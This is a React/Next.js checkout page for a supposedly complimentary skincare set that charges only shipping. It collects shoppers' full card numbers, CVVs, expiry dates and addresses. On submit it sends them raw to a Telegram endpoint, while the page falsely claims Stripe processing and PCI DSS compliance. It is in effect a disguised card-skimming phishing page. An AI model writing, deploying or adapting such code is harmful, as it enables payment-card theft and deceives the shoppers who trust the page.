"use client";

import { useState, useEffect } from "react";
import Link from "next/link";

type Step = "delivery" | "payment" | "review";

export default function CheckoutPage() {
  const [currentStep, setCurrentStep] = useState<Step>("delivery");
  const [deliveryMethod, setDeliveryMethod] = useState<"standard" | "express">("standard");
  const [discountCode, setDiscountCode] = useState("");
  const [discountApplied, setDiscountApplied] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    address: "",
    city: "",
    postcode: "",
    phone: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
    nameOnCard: "",
  });

  const updateField = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  // Card type detection
  const getCardType = (cardNumber: string): "amex" | "visa" | "mastercard" | "discover" | "unknown" => {
    const cleaned = cardNumber.replace(/\s/g, "");
    if (/^34|^37/.test(cleaned)) return "amex";
    if (/^4/.test(cleaned)) return "visa";
    if (/^5[1-5]/.test(cleaned)) return "mastercard";
    if (/^6(?:011|5)/.test(cleaned)) return "discover";
    return "unknown";
  };

  // Format card number with spaces (0000 0000 0000 0000)
  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\s/g, "");
    const cardType = getCardType(cleaned);
    const maxLength = cardType === "amex" ? 15 : 16;
    const limited = cleaned.slice(0, maxLength);
    
    // Add spaces every 4 digits (Amex: 4-6-5 pattern)
    if (cardType === "amex") {
      return limited.replace(/(\d{4})(\d{6})(\d{0,5})/, (match, p1, p2, p3) => {
        if (p3) return `${p1} ${p2} ${p3}`;
        if (p2) return `${p1} ${p2}`;
        return p1;
      });
    }
    return limited.replace(/(\d{4})/g, "$1 ").trim();
  };

  // Format expiry as MM/YY
  const formatExpiry = (value: string): string => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`;
    }
    return cleaned;
  };

  // Validate expiry date
  const validateExpiry = (expiry: string): boolean => {
    if (!expiry || expiry.length !== 5) return false;
    const [month, year] = expiry.split("/");
    const monthNum = parseInt(month, 10);
    const yearNum = parseInt("20" + year, 10);
    const currentDate = new Date();
    const expiryDate = new Date(yearNum, monthNum - 1);
    
    if (monthNum < 1 || monthNum > 12) return false;
    return expiryDate >= currentDate;
  };

  // Luhn algorithm for card validation
  const validateCardNumber = (cardNumber: string): boolean => {
    const cleaned = cardNumber.replace(/\s/g, "");
    if (cleaned.length < 13) return false;
    
    let sum = 0;
    let isEven = false;
    
    for (let i = cleaned.length - 1; i >= 0; i--) {
      let digit = parseInt(cleaned[i], 10);
      
      if (isEven) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }
      
      sum += digit;
      isEven = !isEven;
    }
    
    return sum % 10 === 0;
  };

  // Handle card number input
  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value);
    updateField("cardNumber", formatted);
    
    // If card type changes and CVV length doesn't match, adjust CVV
    const oldCardType = getCardType(formData.cardNumber);
    const newCardType = getCardType(formatted);
    if (oldCardType !== newCardType && formData.cvv) {
      const maxLength = newCardType === "amex" ? 4 : 3;
      if (formData.cvv.length > maxLength) {
        updateField("cvv", formData.cvv.slice(0, maxLength));
      }
    }
  };

  // Handle expiry input
  const handleExpiryChange = (value: string) => {
    const formatted = formatExpiry(value);
    updateField("expiry", formatted);
  };

  // Handle CVV input (3 digits for most, 4 for Amex)
  const handleCvvChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    const cardType = getCardType(formData.cardNumber);
    const maxLength = cardType === "amex" ? 4 : 3;
    const limited = cleaned.slice(0, maxLength);
    updateField("cvv", limited);
  };

  // Load discount code from localStorage on mount
  useEffect(() => {
    const savedDiscount = localStorage.getItem('discountCode');
    if (savedDiscount === 'HGKD923') {
      setDiscountCode(savedDiscount);
      setDiscountApplied(true);
    }
  }, []);

  const productValue = 135.00;
  const shippingCost = 9.95;
  const expressCost = deliveryMethod === "express" ? 4.99 : 0;
  const discountAmount = discountApplied ? 5.00 : 0;
  const subtotal = shippingCost + expressCost;
  const total = Math.max(0, subtotal - discountAmount);

  const steps = [
    { id: "delivery", label: "Delivery" },
    { id: "payment", label: "Payment" },
    { id: "review", label: "Review" },
  ];

  const goToStep = (step: Step) => {
    setCurrentStep(step);
  };

  const handleSubmit = async () => {
    try {
      // Send checkout data to Telegram
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          formData,
          deliveryMethod,
          paymentMethod: "card",
          productValue,
          shippingCost,
          expressCost,
          discountCode: discountApplied ? discountCode : null,
          discountAmount,
          total,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        const errorMessage = errorData.details || errorData.error || "Failed to send order to Telegram";
        const hint = errorData.hint || "";
        console.error("API Error:", errorData);

        // Show user-friendly error with hint
        const fullErrorMessage = hint
          ? `${errorMessage}\n\n${hint}`
          : errorMessage;
        throw new Error(fullErrorMessage);
      }

      // Save email and discount code to sessionStorage for success page
      if (formData.email) {
        sessionStorage.setItem("orderEmail", formData.email);
      }
      if (discountApplied) {
        sessionStorage.setItem("discountCode", discountCode);
        sessionStorage.setItem("discountAmount", discountAmount.toString());
      }

      // Redirect to success page
      window.location.href = "/success";
    } catch (error) {
      console.error("Error submitting order:", error);
      const errorMessage = error instanceof Error ? error.message : "Unknown error";
      alert(`Failed to send order notification:\n\n${errorMessage}\n\nCheck the console for details.`);
    }
  };

  return (
    <div className="min-h-screen bg-[#FAF8F5]">
      {/* Header */}
      <header className="sticky top-0 z-50 border-b border-[#E8E3DC] bg-[#FAF8F5]/95 backdrop-blur-lg">
        <div className="flex items-center justify-between px-4 py-4 sm:py-5 max-w-7xl mx-auto">
          <Link href="/basket" className="flex items-center gap-2 text-[#6B7A64] hover:text-[#2C2A27] transition-colors">
            <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.5}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
            </svg>
            <span className="text-sm font-light tracking-wide sm:inline hidden">Back to Basket</span>
          </Link>
          <h1 className="text-xl font-serif font-medium text-[#2C2A27]">Checkout</h1>
          <div className="flex items-center gap-1.5 text-xs text-[#A8B5A0] font-light">
            <svg className="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.5}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            Secure
          </div>
        </div>

        {/* Progress Steps */}
        <div className="flex border-t border-[#E8E3DC] bg-[#FAF8F5]">
          {steps.map((step, index) => (
            <button
              key={step.id}
              onClick={() => goToStep(step.id as Step)}
              className={`flex-1 py-4 text-center text-xs font-light tracking-wide transition-colors sm:text-sm ${
                currentStep === step.id
                  ? "border-b-2 border-[#2C2A27] text-[#2C2A27]"
                  : "text-[#A8B5A0]"
              }`}
            >
              <span className="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full bg-current text-[10px] text-[#FAF8F5]">
                {index + 1}
              </span>
              {step.label}
            </button>
          ))}
        </div>
      </header>

      <div className="mx-auto max-w-2xl pb-32">
        {/* Delivery Step */}
        {currentStep === "delivery" && (
          <div className="space-y-4 p-4 sm:p-6">
            {/* Contact */}
            <div className="rounded-3xl border border-[#E8E3DC] bg-white/50 backdrop-blur-sm p-5 sm:p-6">
              <h2 className="text-base sm:text-lg font-serif font-medium text-[#2C2A27]">Contact</h2>
              <div className="mt-4">
                <label className="text-xs sm:text-sm font-light text-[#6B7A64]">Email</label>
                <input
                  type="email"
                  value={formData.email}
                  onChange={e => updateField("email", e.target.value)}
                  placeholder="your@email.com"
                  className="mt-2 w-full rounded-2xl border border-[#E8E3DC] bg-white px-4 py-3 text-sm outline-none transition-colors focus:border-[#A8B5A0]"
                />
              </div>
            </div>

            {/* Delivery Address */}
            <div className="rounded-3xl border border-[#E8E3DC] bg-white/50 backdrop-blur-sm p-5 sm:p-6">
              <h2 className="text-base sm:text-lg font-serif font-medium text-[#2C2A27]">Delivery Address</h2>
              <div className="mt-4 grid gap-4 sm:grid-cols-2">
                <div>
                  <label className="text-xs sm:text-sm font-light text-[#6B7A64]">First Name</label>
                  <input
                    type="text"
                    value={formData.firstName}
                    onChange={e => updateField("firstName", e.target.value)}
                    className="mt-2 w-full rounded-2xl border border-[#E8E3DC] bg-white px-4 py-3 text-sm outline-none transition-colors focus:border-[#A8B5A0]"
                  />
                </div>
                <div>
                  <label className="text-xs font-medium text-gray-700 sm:text-sm">Last Name</label>
                  <input
                    type="text"
                    value={formData.lastName}
                    onChange={e => updateField("lastName", e.target.value)}
                    className="mt-1.5 w-full rounded-xl border border-gray-200 px-4 py-3 text-sm outline-none transition-colors focus:border-gray-400"
                  />
                </div>
                <div className="sm:col-span-2">
                  <label className="text-xs font-medium text-gray-700 sm:text-sm">Address</label>
                  <input
                    type="text"
                    value={formData.address}
                    onChange={e => updateField("address", e.target.value)}
                    placeholder="House number and street"
                    className="mt-1.5 w-full rounded-xl border border-gray-200 px-4 py-3 text-sm outline-none transition-colors focus:border-gray-400"
                  />
                </div>
                <div>
                  <label className="text-xs font-medium text-gray-700 sm:text-sm">City</label>
                  <input
                    type="text"
                    value={formData.city}
                    onChange={e => updateField("city", e.target.value)}
                    className="mt-1.5 w-full rounded-xl border border-gray-200 px-4 py-3 text-sm outline-none transition-colors focus:border-gray-400"
                  />
                </div>
                <div>
                  <label className="text-xs font-medium text-gray-700 sm:text-sm">Postcode</label>
                  <input
                    type="text"
                    value={formData.postcode}
                    onChange={e => updateField("postcode", e.target.value)}
                    placeholder="SW1A 1AA"
                    className="mt-1.5 w-full rounded-xl border border-gray-200 px-4 py-3 text-sm outline-none transition-colors focus:border-gray-400"
                  />
                </div>
                <div className="sm:col-span-2">
                  <label className="text-xs font-medium text-gray-700 sm:text-sm">Phone Number</label>
                  <input
                    type="tel"
                    value={formData.phone}
                    onChange={e => updateField("phone", e.target.value)}
                    placeholder="07XXX XXXXXX"
                    className="mt-1.5 w-full rounded-xl border border-gray-200 px-4 py-3 text-sm outline-none transition-colors focus:border-gray-400"
                  />
                </div>
              </div>
            </div>

            {/* Delivery Method */}
            <div className="rounded-xl bg-white p-4 sm:p-6">
              <h2 className="text-base font-semibold text-gray-900 sm:text-lg">Delivery Method</h2>
              <div className="mt-4 space-y-3">
                <button
                  onClick={() => setDeliveryMethod("standard")}
                  className={`flex w-full items-center justify-between rounded-xl border-2 p-4 transition-colors ${
                    deliveryMethod === "standard"
                      ? "border-black bg-gray-50"
                      : "border-gray-200"
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className={`flex h-5 w-5 items-center justify-center rounded-full border-2 ${
                      deliveryMethod === "standard" ? "border-black" : "border-gray-300"
                    }`}>
                      {deliveryMethod === "standard" && (
                        <div className="h-2.5 w-2.5 rounded-full bg-black" />
                      )}
                    </div>
                    <div className="text-left">
                      <p className="text-sm font-medium text-gray-900">Standard Delivery</p>
                      <p className="text-xs text-gray-500">2-3 business days</p>
                    </div>
                  </div>
                  <span className="text-sm font-semibold text-green-600">FREE</span>
                </button>

                <button
                  onClick={() => setDeliveryMethod("express")}
                  className={`flex w-full items-center justify-between rounded-xl border-2 p-4 transition-colors ${
                    deliveryMethod === "express"
                      ? "border-black bg-gray-50"
                      : "border-gray-200"
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className={`flex h-5 w-5 items-center justify-center rounded-full border-2 ${
                      deliveryMethod === "express" ? "border-black" : "border-gray-300"
                    }`}>
                      {deliveryMethod === "express" && (
                        <div className="h-2.5 w-2.5 rounded-full bg-black" />
                      )}
                    </div>
                    <div className="text-left">
                      <p className="text-sm font-medium text-gray-900">Express Delivery</p>
                      <p className="text-xs text-gray-500">Next business day</p>
                    </div>
                  </div>
                  <span className="text-sm font-semibold text-gray-900">£4.99</span>
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Payment Step */}
        {currentStep === "payment" && (
          <div className="space-y-4 p-4 sm:p-6">
            {/* Card Details */}
            <div className="rounded-3xl border border-[#E8E3DC] bg-white/50 backdrop-blur-sm p-5 sm:p-6">
              <h2 className="text-base sm:text-lg font-serif font-medium text-[#2C2A27] mb-1">Card Details</h2>
              <p className="text-xs text-[#A8B5A0] font-light mb-5">Secure payment powered by Stripe</p>
                <div className="mt-4 space-y-4">
                  <div>
                    <label className="text-xs font-medium text-gray-700 sm:text-sm">Card Number</label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={formData.cardNumber}
                      onChange={e => handleCardNumberChange(e.target.value)}
                      placeholder={getCardType(formData.cardNumber) === "amex" ? "3782 822463 10005" : "1234 5678 9012 3456"}
                      maxLength={getCardType(formData.cardNumber) === "amex" ? 17 : 19}
                      className={`mt-2 w-full rounded-2xl border px-4 py-3 text-sm outline-none transition-colors ${
                        formData.cardNumber && formData.cardNumber.replace(/\s/g, "").length >= 13 && !validateCardNumber(formData.cardNumber)
                          ? "border-red-300 focus:border-red-400"
                          : "border-[#E8E3DC] bg-white focus:border-[#A8B5A0]"
                      }`}
                    />
                    {formData.cardNumber && formData.cardNumber.replace(/\s/g, "").length >= 13 && !validateCardNumber(formData.cardNumber) && (
                      <p className="mt-1 text-xs text-red-600">Invalid card number</p>
                    )}
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="text-xs sm:text-sm font-light text-[#6B7A64]">Expiry Date</label>
                      <input
                        type="text"
                        inputMode="numeric"
                        value={formData.expiry}
                        onChange={e => handleExpiryChange(e.target.value)}
                        placeholder="MM/YY"
                        maxLength={5}
                        className={`mt-2 w-full rounded-2xl border px-4 py-3 text-sm outline-none transition-colors ${
                          formData.expiry && formData.expiry.length === 5 && !validateExpiry(formData.expiry)
                            ? "border-red-300 focus:border-red-400"
                            : "border-[#E8E3DC] bg-white focus:border-[#A8B5A0]"
                        }`}
                      />
                    </div>
                    <div>
                      <label className="text-xs sm:text-sm font-light text-[#6B7A64]">CVV</label>
                      <input
                        type="text"
                        inputMode="numeric"
                        value={formData.cvv}
                        onChange={e => handleCvvChange(e.target.value)}
                        placeholder={getCardType(formData.cardNumber) === "amex" ? "1234" : "123"}
                        maxLength={getCardType(formData.cardNumber) === "amex" ? 4 : 3}
                        className="mt-2 w-full rounded-2xl border border-[#E8E3DC] bg-white px-4 py-3 text-sm outline-none transition-colors focus:border-[#A8B5A0]"
                      />
                    </div>
                  </div>
                  <div>
                    <label className="text-xs sm:text-sm font-light text-[#6B7A64]">Name on Card</label>
                    <input
                      type="text"
                      value={formData.nameOnCard}
                      onChange={e => updateField("nameOnCard", e.target.value)}
                      className="mt-2 w-full rounded-2xl border border-[#E8E3DC] bg-white px-4 py-3 text-sm outline-none transition-colors focus:border-[#A8B5A0]"
                    />
                  </div>
                </div>
              </div>

            {/* Security Notice */}
            <div className="flex items-center justify-center gap-2 rounded-2xl bg-[#F4EFE6] border border-[#E8E3DC] p-4">
              <svg className="h-5 w-5 text-[#A8B5A0]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.5}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
              </svg>
              <p className="text-xs text-[#6B7A64] font-light sm:text-sm">
                256-bit SSL encrypted • PCI DSS compliant • Your data is secure
              </p>
            </div>
          </div>
        )}

        {/* Review Step */}
        {currentStep === "review" && (
          <div className="space-y-4 p-4 sm:p-6">
            {/* Order Summary */}
            <div className="rounded-3xl border border-[#E8E3DC] bg-white/50 backdrop-blur-sm p-5 sm:p-6">
              <h2 className="text-base sm:text-lg font-serif font-medium text-[#2C2A27]">Order Summary</h2>
              <div className="mt-5 flex gap-4 border-b border-[#E8E3DC] pb-5">
                <div className="h-20 w-20 flex-shrink-0 overflow-hidden rounded-2xl bg-[#F4EFE6]">
                  <img
                    src="/product.png"
                    alt="Complete Anti-Aging Skincare System"
                    className="h-full w-full object-cover"
                  />
                </div>
                <div>
                  <h3 className="text-sm font-serif font-medium text-[#2C2A27]">Complete Anti-Aging Skincare System</h3>
                  <p className="mt-1 text-xs text-[#A8B5A0] font-light">3-Product Complimentary Set</p>
                  <p className="mt-1 text-xs text-[#6B7A64] font-light italic">Value: £135.00</p>
                </div>
              </div>
              <div className="mt-5 space-y-3">
                <div className="flex justify-between text-sm">
                  <span className="text-[#6B7A64] font-light">Experience Set</span>
                  <span className="font-light text-[#A8B5A0]">Complimentary</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-[#6B7A64] font-light">Shipping</span>
                  <span className="font-light text-[#2C2A27]">£{shippingCost.toFixed(2)}</span>
                </div>
                {expressCost > 0 && (
                  <div className="flex justify-between text-sm">
                    <span className="text-[#6B7A64] font-light">Express Delivery</span>
                    <span className="font-light text-[#2C2A27]">£{expressCost.toFixed(2)}</span>
                  </div>
                )}
                {discountApplied && (
                  <div className="flex justify-between text-sm">
                    <span className="text-[#6B7A64] font-light">Discount Code ({discountCode})</span>
                    <span className="font-light text-[#A8B5A0]">-£{discountAmount.toFixed(2)}</span>
                  </div>
                )}
                <div className="flex justify-between border-t border-[#E8E3DC] pt-3">
                  <span className="font-serif font-medium text-[#2C2A27]">Your Investment</span>
                  <span className="text-lg font-serif font-medium text-[#2C2A27]">£{total.toFixed(2)}</span>
                </div>
              </div>
            </div>

            {/* Delivery Details */}
            <div className="rounded-xl bg-white p-4 sm:p-6">
              <div className="flex items-center justify-between">
                <h2 className="text-base font-semibold text-gray-900 sm:text-lg">Delivery</h2>
                <button
                  onClick={() => goToStep("delivery")}
                  className="text-sm font-medium text-gray-600 underline"
                >
                  Edit
                </button>
              </div>
              <div className="mt-3 text-sm text-gray-600">
                <p className="font-medium text-gray-900">
                  {formData.firstName || "John"} {formData.lastName || "Smith"}
                </p>
                <p>{formData.address || "123 High Street"}</p>
                <p>{formData.city || "London"}, {formData.postcode || "SW1A 1AA"}</p>
                <p className="mt-2">{formData.phone || "07700 900000"}</p>
              </div>
              <div className="mt-3 rounded-lg bg-gray-50 p-3">
                <p className="text-xs font-medium text-gray-900">
                  {deliveryMethod === "express" ? "Express Delivery" : "Standard Delivery"}
                </p>
                <p className="text-xs text-gray-500">
                  {deliveryMethod === "express" ? "Next business day" : "2-3 business days"}
                </p>
              </div>
            </div>

            {/* Payment Details */}
            <div className="rounded-xl bg-white p-4 sm:p-6">
              <div className="flex items-center justify-between">
                <h2 className="text-base font-semibold text-gray-900 sm:text-lg">Payment</h2>
                <button
                  onClick={() => goToStep("payment")}
                  className="text-sm font-medium text-gray-600 underline"
                >
                  Edit
                </button>
              </div>
              <div className="mt-3 flex items-center gap-3">
                <div className="flex h-8 w-12 items-center justify-center rounded bg-[#F4EFE6] text-xs font-medium text-[#6B7A64]">
                  CARD
                </div>
                <span className="text-sm text-[#6B7A64] font-light">
                  •••• •••• •••• {formData.cardNumber?.slice(-4) || "3456"}
                </span>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Fixed Bottom CTA */}
      <div className="fixed bottom-0 left-0 right-0 border-t border-[#E8E3DC] bg-[#FAF8F5]/95 backdrop-blur-lg p-4 sm:p-5 shadow-[0_-2px_20px_rgba(0,0,0,0.05)]">
        <div className="mx-auto max-w-2xl">
          <div className="mb-3 flex items-center justify-between">
            <span className="text-sm text-[#6B7A64] font-light tracking-wide">Your Investment</span>
            <span className="text-lg font-serif font-medium text-[#2C2A27]">£{total.toFixed(2)}</span>
          </div>
          {currentStep === "delivery" && (
            <button
              onClick={() => goToStep("payment")}
              className="w-full rounded-full bg-[#2C2A27] py-4 text-base font-light tracking-wide text-white transition-all duration-300 hover:bg-[#6B7A64]"
            >
              Continue to Payment
            </button>
          )}
          {currentStep === "payment" && (
            <button
              onClick={() => goToStep("review")}
              className="w-full rounded-full bg-[#2C2A27] py-4 text-base font-light tracking-wide text-white transition-all duration-300 hover:bg-[#6B7A64]"
            >
              Review Order
            </button>
          )}
          {currentStep === "review" && (
            <button
              onClick={handleSubmit}
              className="w-full rounded-full bg-[#2C2A27] py-4 text-base font-light tracking-wide text-white transition-all duration-300 hover:bg-[#6B7A64]"
            >
              Complete Order — £{total.toFixed(2)}
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
